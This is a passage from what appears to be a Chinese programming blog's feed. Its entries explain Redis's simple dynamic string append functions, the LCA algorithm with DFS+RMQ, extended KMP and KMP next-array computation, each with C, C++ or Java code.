class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 以t作为新添加的len长度buf的数据，实现追加操作 *&#x2F;</span><br><span class="line">sds sdscatlen(sds s, const void *t, size_t len) &#123;</span><br><span class="line">    struct sdshdr *sh;</span><br><span class="line">    size_t curlen &#x3D; sdslen(s);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;为原字符串扩展len长度空间</span><br><span class="line">    s &#x3D; sdsMakeRoomFor(s,len);</span><br><span class="line">    if (s &#x3D;&#x3D; NULL) return NULL;</span><br><span class="line">    sh &#x3D; (void*) (s-(sizeof(struct sdshdr)));</span><br><span class="line">    &#x2F;&#x2F;多余的数据以t作初始化</span><br><span class="line">    memcpy(s+curlen, t, len);</span><br><span class="line">    &#x2F;&#x2F;更改相应的len,free值</span><br><span class="line">    sh-&gt;len &#x3D; curlen+len;</span><br><span class="line">    sh-&gt;free &#x3D; sh-&gt;free-len;</span><br><span class="line">    s[curlen+len] &#x3D; &#39;\0&#39;;</span><br><span class="line">    return s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* Append the specified null termianted C string to the sds string &#39;s&#39;.</span><br><span class="line"> *</span><br><span class="line"> * After the call, the passed sds string is no longer valid and all the</span><br><span class="line"> * references must be substituted with the new pointer returned by the call. *&#x2F;</span><br><span class="line">&#x2F;* 追加t字符串 *&#x2F;</span><br><span class="line">sds sdscat(sds s, const char *t) &#123;</span><br><span class="line">    return sdscatlen(s, t, strlen(t));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="参考书籍："><a href="#参考书籍：" class="headerlink" title="参考书籍："></a><strong>参考书籍：</strong></h4><p>黄健宏的《Redis设计与实现》</p><h4 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a><strong>参考博客：</strong></h4><p><a href="http://blog.csdn.net/androidlushangderen/article/" target="_blank" rel="noopener">http://blog.csdn.net/androidlushangderen/article/</a></p><p><a href="http://blog.csdn.net/xiejingfa/article" target="_blank" rel="noopener"> http://blog.csdn.net/xiejingfa/article</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Redis底层数据结构之简单动态字符串&quot;&gt;&lt;a href=&quot;#Redis底层数据结构之简单动态字符串&quot; class=&quot;headerlink&quot; title=&quot;Redis底层数据结构之简单动态字符串&quot;&gt;&lt;/a&gt;&lt;strong&gt;Redis底层数据结构之简单动态字符串&lt;/
      
    
    </summary>
    
    
      <category term="redis学习" scheme="https://blog.kaide0521.cn/categories/redis%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="redis" scheme="https://blog.kaide0521.cn/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>LCA算法详解</title>
    <link href="https://blog.kaide0521.cn/2020/01/05/LCA%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/"/>
    <id>https://blog.kaide0521.cn/2020/01/05/LCA%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/</id>
    <published>2020-01-05T13:18:57.000Z</published>
    <updated>2020-01-05T13:19:36.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="LCA算法详解"><a href="#LCA算法详解" class="headerlink" title="LCA算法详解"></a>LCA算法详解</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h3><p>LCA（Least Common Ancestors），即最近公共祖先，是指这样一个问题：在有根树中，找出某两个结点u和v最近的公共祖先（另一种说法，离树根最远的公共祖先）。对于该问题，最容易想到的解决方案是遍历，复杂度是O(n)。但当数据量非常大且查询很频繁时，该算法也许会存在问题。</p><h3 id="2-在线ST算法"><a href="#2-在线ST算法" class="headerlink" title="2. 在线ST算法"></a>2. 在线ST算法</h3><p>解决此问题存在两种经典的算法，一种是在线ST算法，另外一种是离线的Tarjan算法，<br>所谓在线算法是指用户每输入一个查询便马上处理一个查询，该算法一般用较长的时间做预处理，待信息充足以后便可以用较少的时间回答每个查询。<br>所谓离线算法，是指首先读入所有的询问（求一次LCA叫做一次询问），然后重新组织查询处理顺序以便得到更高效的处理方法<br>在线算法DFS+ST描述：将树看成一个无向图，u和v的公共祖先一定在u与v之间的最短路径上</p><p>  ● DFS：从树的根节点T开始，深度遍历树，并记录下每次到达的顶点。第一个的结点是root(T)，每经过一条边都记录它的端点。由于每条边恰好经过2次，因此一共记录了2n-1个结点，用E[1, … , 2n-1]来表示。</p><p>  ● 计算R[]：用R[i]表示E数组中值为i的元素第一次出现的下标，即如果R[u] &lt; R[v]时，DFS访问的顺序是E[R[u], R[u]+1, …, R[v]]。虽然其中包含u的后代，但深度最小的还是u与v的公共祖先。</p><p>  ● RMQ：当R[u] ≥ R[v]时，LCA[T, u, v] = RMQ(L, R[v], R[u])；否则LCA[T, u, v] = RMQ(L, R[u], R[v])，计算RMQ。</p><h4 id="在线算法DFS-ST代码如下："><a href="#在线算法DFS-ST代码如下：" class="headerlink" title="在线算法DFS+ST代码如下："></a>在线算法DFS+ST代码如下：</h4><h5 id="1-数据结构描述："><a href="#1-数据结构描述：" class="headerlink" title="1.数据结构描述："></a>1.数据结构描述：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line">   &#x2F;&#x2F; 头结点信息</span><br><span class="line">private Node heads[];</span><br><span class="line">&#x2F;&#x2F; 边信息</span><br><span class="line">private Edge edges[];</span><br><span class="line">&#x2F;&#x2F; 深度遍历过程中每个节点第一次出现的序号</span><br><span class="line">private int first[];</span><br><span class="line">&#x2F;&#x2F; 每个节点出现的深度</span><br><span class="line">private int depth[];</span><br><span class="line">&#x2F;&#x2F; 深度遍历序列</span><br><span class="line">private int travel[];</span><br><span class="line">&#x2F;&#x2F; 保存节点到根节点的距离</span><br><span class="line">private int dir[];</span><br><span class="line">&#x2F;&#x2F; 访问记录矩阵</span><br><span class="line">private boolean vis[];</span><br><span class="line">private RMQ mRmq;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 邻接表头结点信息</span><br><span class="line"> *&#x2F;</span><br><span class="line">class Node &#123;</span><br><span class="line">private int sno;&#x2F;&#x2F; 节点编号</span><br><span class="line">private Edge firstEdge;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 邻接表边信息</span><br><span class="line"> *&#x2F;</span><br><span class="line">class Edge &#123;</span><br><span class="line">private int sno;</span><br><span class="line">private int from;</span><br><span class="line">private int to;</span><br><span class="line">private int wight;</span><br><span class="line">private Edge next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="1-算法步骤描述："><a href="#1-算法步骤描述：" class="headerlink" title="1.算法步骤描述："></a>1.算法步骤描述：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">#####     1.根据输入的节点和权重信息建立邻接表</span><br><span class="line">    &#x2F;**</span><br><span class="line"> * 无向图创建路径</span><br><span class="line"> * </span><br><span class="line"> * @param from</span><br><span class="line"> * @param to</span><br><span class="line"> * @param wight</span><br><span class="line"> *&#x2F;</span><br><span class="line">public void createEdge(int from, int to, int wight) &#123;</span><br><span class="line">addEdge(from, to, wight);</span><br><span class="line">addEdge(to, from, wight);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 头插法创建邻接表</span><br><span class="line"> * </span><br><span class="line"> * @param from</span><br><span class="line"> * @param to</span><br><span class="line"> * @param wight</span><br><span class="line"> *&#x2F;</span><br><span class="line">private void addEdge(int from, int to, int wight) &#123;</span><br><span class="line">Edge edge &#x3D; new Edge();</span><br><span class="line">edge.from &#x3D; from;</span><br><span class="line">edge.to &#x3D; to;</span><br><span class="line">edge.wight &#x3D; wight;</span><br><span class="line">edge.sno &#x3D; edgeNum;</span><br><span class="line">edges[edgeNum++] &#x3D; edge;</span><br><span class="line">edge.next &#x3D; heads[from].firstEdge;</span><br><span class="line">heads[from].sno &#x3D; from;</span><br><span class="line">heads[from].firstEdge &#x3D; edge;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#####     2.深度优先遍历，计算访问序列、深度信息、节点第一次出现的位置信息等</span><br><span class="line">    </span><br><span class="line">    &#x2F;**</span><br><span class="line"> * 深度遍历邻接表</span><br><span class="line"> * </span><br><span class="line"> * @param u</span><br><span class="line"> * @param dep</span><br><span class="line"> *&#x2F;</span><br><span class="line">public void travelInDepth(int u, int dep) &#123;</span><br><span class="line">vis[u] &#x3D; true;</span><br><span class="line">travel[++index] &#x3D; u;</span><br><span class="line">first[u] &#x3D; index;</span><br><span class="line">depth[index] &#x3D; dep;</span><br><span class="line">for (Edge edge &#x3D; heads[u].firstEdge; edge !&#x3D; null; edge &#x3D; edge.next) &#123;</span><br><span class="line">if (!vis[edge.to]) &#123;</span><br><span class="line">int v &#x3D; edge.to;</span><br><span class="line">dir[v] &#x3D; dir[u] + edge.wight;</span><br><span class="line">travelInDepth(v, dep + 1);</span><br><span class="line">travel[++index] &#x3D; u;</span><br><span class="line">depth[index] &#x3D; dep;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#####     3.根据输入的查询，回答结果</span><br><span class="line">    &#x2F;**</span><br><span class="line"> * 回答节点的最近公共祖先节点</span><br><span class="line"> * @param u</span><br><span class="line"> * @param v</span><br><span class="line"> * @return</span><br><span class="line"> *&#x2F;</span><br><span class="line">public int getLCANode(int u, int v) &#123;</span><br><span class="line">if (mRmq &#x3D;&#x3D; null) &#123;</span><br><span class="line">mRmq &#x3D; new RMQ();</span><br><span class="line">mRmq.RMQInit(depth);</span><br><span class="line">&#125;</span><br><span class="line">u &#x3D; first[u];</span><br><span class="line">v &#x3D; first[v];</span><br><span class="line">if (u &lt; v) &#123;</span><br><span class="line">return mRmq.getMax(u, v);</span><br><span class="line">&#125;</span><br><span class="line">return mRmq.getMax(v, u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;LCA算法详解&quot;&gt;&lt;a href=&quot;#LCA算法详解&quot; class=&quot;headerlink&quot; title=&quot;LCA算法详解&quot;&gt;&lt;/a&gt;LCA算法详解&lt;/h2&gt;&lt;h3 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="算法练习" scheme="https://blog.kaide0521.cn/categories/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0/"/>
    
    
      <category term="最近公共祖先" scheme="https://blog.kaide0521.cn/tags/%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/"/>
    
  </entry>
  
  <entry>
    <title>扩展KMP</title>
    <link href="https://blog.kaide0521.cn/2020/01/05/%E6%89%A9%E5%B1%95KMP/"/>
    <id>https://blog.kaide0521.cn/2020/01/05/%E6%89%A9%E5%B1%95KMP/</id>
    <published>2020-01-05T13:18:04.000Z</published>
    <updated>2020-01-05T13:18:34.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="扩展KMP"><a href="#扩展KMP" class="headerlink" title="扩展KMP"></a>扩展KMP</h2><ul><li><p>什么是扩展KMP</p></li><li><p>扩展KMP的原理</p></li><li><p>扩展KMP的编程实现</p></li><li><p>扩展KMP的用途</p></li></ul><h6 id="参照-http-blog-csdn-net-dyx404514-article-details-41831947"><a href="#参照-http-blog-csdn-net-dyx404514-article-details-41831947" class="headerlink" title="参照 ++http://blog.csdn.net/dyx404514/article/details/41831947++"></a>参照 ++<a href="http://blog.csdn.net/dyx404514/article/details/41831947++" target="_blank" rel="noopener">http://blog.csdn.net/dyx404514/article/details/41831947++</a></h6><hr><h3 id="1-什么是扩展KMP"><a href="#1-什么是扩展KMP" class="headerlink" title="1 什么是扩展KMP"></a>1 什么是扩展KMP</h3><p>给出模板串S和T，长度分别为Slen和Tlen，要求在线性时间内，对于每个S[i]（0&lt;=i&lt;Slen），</p><p>求出S[i..Slen-1]与T的最长公共前缀长度，记为extend[i]</p><p>（或者说，extend[i]为满足S[i..i+z-1]==T[0..z-1]的最大的z值）。</p><p>扩展KMP可以用来解决很多字符串问题，如求一个字符串的最长回文子串和最长重复子串。</p><h3 id="2-扩展KMP的原理"><a href="#2-扩展KMP的原理" class="headerlink" title="2 扩展KMP的原理"></a>2 扩展KMP的原理</h3><pre><code>记母串为S,模式串为T，next[i]表示模式串S的后缀</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T[i...len(T)]</span><br></pre></td></tr></table></figure><pre><code>与模式串T的最长公共前缀。记为extend[i]为满足</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S[i..i+z-1]&#x3D;T[0..z-1]</span><br></pre></td></tr></table></figure><pre><code>的最大的z值，即S串以i开头的后缀与T的最长公共前缀。</code></pre><h4 id="2-1-拓展kmp算法一般步骤"><a href="#2-1-拓展kmp算法一般步骤" class="headerlink" title="2.1 拓展kmp算法一般步骤"></a>2.1 拓展kmp算法一般步骤</h4><p>首先我们从左到右依次计算extend数组，在某一时刻，设extend[0…k]已经计算完毕，并且之</p><p>前匹配过程中所达到的最远位置为P，所谓最远位置，严格来说就是i+extend[i]-1的最大值</p><p>（0&lt;=i&lt;=k）,并且设取这个最大值的位置为P</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">S ：0......p0.....k k+1......p.......len(s) 现在要计算extend[k+1],根据extend的定义</span><br><span class="line"></span><br><span class="line">有S[p0....p] &#x3D; T[0...p-p0] ——&gt; S[k+1,P] &#x3D; T[k-p0+1,P-po]</span><br><span class="line"></span><br><span class="line">令 len &#x3D; next[k-p0+1]</span><br><span class="line"></span><br><span class="line">（前面介绍了next数组的含义,表示T串与T[k-p0+1,len(T)]的最长公共前缀）;</span><br><span class="line"></span><br><span class="line">下面通过两种情况讨论：</span><br><span class="line"></span><br><span class="line">    1. if k+len &lt; P : </span><br><span class="line">            </span><br><span class="line">        S[k+1,k+len] &#x3D; T[0,len] ——&gt; 则S[k+len+1]一定与T[len]不相等，为什么呢？</span><br><span class="line">        </span><br><span class="line">        &#x2F;&#x2F; 因为T[k-p0+1+len] &#x3D; S[k+1+len]，由next数组可知T[k-p0+1+len-1] &#x3D; T[len-1]</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; T[k-p0+1+len] ！&#x3D; T[len] ——&gt; S[k+len+1] !&#x3D;  T[len] </span><br><span class="line">        </span><br><span class="line">        即 extend[k+1] &#x3D; len</span><br><span class="line">        </span><br><span class="line">    2. if k + len &gt; p : </span><br><span class="line">    </span><br><span class="line">        S[p+1]之后的字符都是未知的，也就是还未进行过匹配的字符串，</span><br><span class="line">        </span><br><span class="line">        所以在这种情况下，就要从S[P+1]和T[P-k+1]开始一一匹配，直到发生失配为止，</span><br><span class="line">        </span><br><span class="line">        当匹配完成后，如果得到的extend[k+1]+(k+1)大于P则要更新未知P和p0</span><br><span class="line"></span><br><span class="line">    至此，拓展kmp算法的过程已经描述完成</span><br></pre></td></tr></table></figure><h3 id="扩展KMP的编程实现"><a href="#扩展KMP的编程实现" class="headerlink" title="扩展KMP的编程实现"></a>扩展KMP的编程实现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">const int maxn&#x3D;100010;   &#x2F;&#x2F;字符串长度最大值  </span><br><span class="line">int next[maxn],ex[maxn]; &#x2F;&#x2F;ex数组即为extend数组  </span><br><span class="line">&#x2F;&#x2F;预处理计算next数组  </span><br><span class="line">void GETNEXT(char *str)  </span><br><span class="line">&#123;  </span><br><span class="line">    int i &#x3D; 0,j,po,len&#x3D;strlen(str);  </span><br><span class="line">    next[0] &#x3D; len;&#x2F;&#x2F;初始化next[0]  </span><br><span class="line">    while( str[i] &#x3D;&#x3D; str[i+1] &amp;&amp; i+1 &lt; len)&#x2F;&#x2F;计算next[1]  </span><br><span class="line">    i++;  </span><br><span class="line">    next[1] &#x3D; i;  </span><br><span class="line">    po &#x3D; 1;&#x2F;&#x2F;初始化po的位置  </span><br><span class="line">    for( i &#x3D; 2; i &lt; len; i++ )  </span><br><span class="line">    &#123;  </span><br><span class="line">        if( next[i-po]+i &lt; next[po]+po )&#x2F;&#x2F;第一种情况，可以直接得到next[i]的值  </span><br><span class="line">        next[i] &#x3D; next[i-po];  </span><br><span class="line">        else&#x2F;&#x2F;第二种情况，要继续匹配才能得到next[i]的值  </span><br><span class="line">        &#123;  </span><br><span class="line">            j &#x3D; next[po]+po-i;  </span><br><span class="line">            if( j &lt; 0 )j &#x3D; 0;&#x2F;&#x2F;如果i&gt;po+next[po],则要从头开始匹配  </span><br><span class="line">            while( i+j &lt; len &amp;&amp; str[j] &#x3D;&#x3D; str[j+i] )&#x2F;&#x2F;计算next[i]  </span><br><span class="line">            j++;  </span><br><span class="line">            next[i] &#x3D; j;  </span><br><span class="line">            po &#x3D; i;&#x2F;&#x2F;更新po的位置  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">&#x2F;&#x2F;计算extend数组  </span><br><span class="line">void EXKMP(char *s1,char *s2)  </span><br><span class="line">&#123;  </span><br><span class="line">    int i &#x3D; 0,j,po,len &#x3D; strlen(s1),l2 &#x3D; strlen(s2);  </span><br><span class="line">    GETNEXT(s2);&#x2F;&#x2F;计算子串的next数组  </span><br><span class="line">    while ( s1[i] &#x3D;&#x3D; s2[i] &amp;&amp; i &lt; l2 &amp;&amp; i &lt; len )&#x2F;&#x2F;计算ex[0]  </span><br><span class="line">    i++;  </span><br><span class="line">    ex[0] &#x3D; i;  </span><br><span class="line">    po &#x3D; 0;&#x2F;&#x2F;初始化po的位置  </span><br><span class="line">    for( i &#x3D; 1; i &lt; len; i++)  </span><br><span class="line">    &#123;  </span><br><span class="line">        if( next[i-po]+i &lt; ex[po]+po )&#x2F;&#x2F;第一种情况，直接可以得到ex[i]的值  </span><br><span class="line">        ex[i] &#x3D; next[i-po];  </span><br><span class="line">        else&#x2F;&#x2F;第二种情况，要继续匹配才能得到ex[i]的值  </span><br><span class="line">        &#123;  </span><br><span class="line">            j &#x3D; ex[po]+po-i;  </span><br><span class="line">            if( j &lt; 0 ) j &#x3D; 0;&#x2F;&#x2F;如果i&gt;ex[po]+po则要从头开始匹配  </span><br><span class="line">            while( i+j &lt; len &amp;&amp; j &lt; l2 &amp;&amp; s1[j+i] &#x3D;&#x3D; s2[j] )&#x2F;&#x2F;计算ex[i]  </span><br><span class="line">            j++;  </span><br><span class="line">            ex[i] &#x3D; j;  </span><br><span class="line">            po &#x3D; i;&#x2F;&#x2F;更新po的位置  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;扩展KMP&quot;&gt;&lt;a href=&quot;#扩展KMP&quot; class=&quot;headerlink&quot; title=&quot;扩展KMP&quot;&gt;&lt;/a&gt;扩展KMP&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;什么是扩展KMP&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;扩展KMP的原理&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
      
    
    </summary>
    
    
      <category term="算法练习" scheme="https://blog.kaide0521.cn/categories/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0/"/>
    
    
      <category term="扩展KMP" scheme="https://blog.kaide0521.cn/tags/%E6%89%A9%E5%B1%95KMP/"/>
    
  </entry>
  
  <entry>
    <title>KMP算法的理解</title>
    <link href="https://blog.kaide0521.cn/2020/01/05/KMP%E7%AE%97%E6%B3%95%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <id>https://blog.kaide0521.cn/2020/01/05/KMP%E7%AE%97%E6%B3%95%E7%9A%84%E7%90%86%E8%A7%A3/</id>
    <published>2020-01-05T13:17:09.000Z</published>
    <updated>2020-01-05T13:17:36.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="KMP算法的理解"><a href="#KMP算法的理解" class="headerlink" title="KMP算法的理解"></a>KMP算法的理解</h2><ul><li>KMP算法的核心思想</li><li>KMP算法的实现原理</li><li>KMP算法的编程实现</li><li>KMP的改进</li></ul><h3 id="KMP算法的核心思想"><a href="#KMP算法的核心思想" class="headerlink" title="KMP算法的核心思想"></a>KMP算法的核心思想</h3><p>kmp算法的核心即是计算模式串的每一个位置之前的字符串的前缀和后缀公共部分的最大长度（不包括字符串本身，否则最大长度始终是字符串本身）</p><h3 id="KMP算法的编程实现"><a href="#KMP算法的编程实现" class="headerlink" title="KMP算法的编程实现"></a>KMP算法的编程实现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">void get_next(char *T, int *next)  </span><br><span class="line">&#123;  </span><br><span class="line">    int k &#x3D; -1;  </span><br><span class="line">    int j &#x3D; 0;  </span><br><span class="line">    next[j] &#x3D; k;  </span><br><span class="line">    while (j &lt; strlen(T))  </span><br><span class="line">    &#123;  </span><br><span class="line">        if ( (k &#x3D;&#x3D; -1) || (T[j] &#x3D;&#x3D; T[k]) ) &#x2F;&#x2F;注意等号是&#x3D;&#x3D;，而不是&#x3D;  </span><br><span class="line">        &#123;  </span><br><span class="line">            ++k; &#x2F;&#x2F; 注意是先加后使用  </span><br><span class="line">            ++j;  </span><br><span class="line">            next[j] &#x3D; k;  </span><br><span class="line">        &#125;  </span><br><span class="line">        else  </span><br><span class="line">        &#123;  </span><br><span class="line">            k &#x3D; next[k];   </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="KMP的改进"><a href="#KMP的改进" class="headerlink" title="KMP的改进"></a>KMP的改进</h3><p>注意到，上面的getNext函数还存在可以优化的地方，比如：</p><p>S: a   a   a   b   a   a   a   a   b</p><p>P: a   a   a   a   b</p><p>此时，i=3、j=3时发生失配，next[3]=2，此时还需要进行 3 次比较：</p><p>i=3, j=2;  </p><p>i=3, j=1;  </p><p>i=3, j=0。</p><p>而实际上，因为i=3, j=3时就已经知道a!=b，而之后的三次依旧是拿 a 和 b 比较，因此这三次比较都是多余的。</p><p>此时应当直接将P向右滑动4个字符，进行 i=4， j=0的比较。</p><p>一般而言，在getNext函数中，next[i]=j，也就是说当p[i]与S中某个字符匹配失败的时候，用p[j]继续与S中的这个字符比较。但是如果p[i]==p[j]，那么这次比较是多余的，因为p[i]与母串中的字符不匹配，那么p[j]==p[i]那么一定也和母串的字符不匹配，因此比较是多余的，此时应该直接使next[i]=next[j]。</p><p>完整的实现代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">void getNextUpdate(const std::string&amp; p, std::vector&lt;int&gt;&amp; next)</span><br><span class="line">&#123;</span><br><span class="line">    next.resize(p.size());</span><br><span class="line">    next[0] &#x3D; -1;</span><br><span class="line">    int i &#x3D; 0, j &#x3D; -1;</span><br><span class="line">    while (i !&#x3D; p.size() - 1)</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F;这里注意，i&#x3D;&#x3D;0的时候实际上求的是nextVector[1]的值，以此类推</span><br><span class="line">        if (j &#x3D;&#x3D; -1 || p[i] &#x3D;&#x3D; p[j])</span><br><span class="line">        &#123;</span><br><span class="line">            ++i;</span><br><span class="line">            ++j;</span><br><span class="line">            &#x2F;&#x2F;注意这里是++i和++j之后的p[i]、p[j]</span><br><span class="line">            next[i] &#x3D; p[i] !&#x3D; p[j] ? j : next[j];</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            j &#x3D; next[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;KMP算法的理解&quot;&gt;&lt;a href=&quot;#KMP算法的理解&quot; class=&quot;headerlink&quot; title=&quot;KMP算法的理解&quot;&gt;&lt;/a&gt;KMP算法的理解&lt;/h2&gt;&lt;ul&gt;
